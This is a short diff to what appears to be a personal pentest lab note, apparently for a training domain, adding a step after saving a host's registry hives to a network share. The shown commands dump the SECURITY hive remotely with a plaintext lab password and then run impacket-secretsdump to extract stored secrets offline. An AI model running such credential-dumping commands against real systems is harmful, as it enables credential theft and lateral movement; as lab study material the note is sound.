@@ -30,3 +30,7 @@ impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\S
 impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.6\share'
 ```
 ![[Pasted image 20230906165710.png]]
+E dumpa i "secrets"
+```bash
+impacket-secretsdump -security SECURITY.save -system SYSTEM.save LOCAL
+```
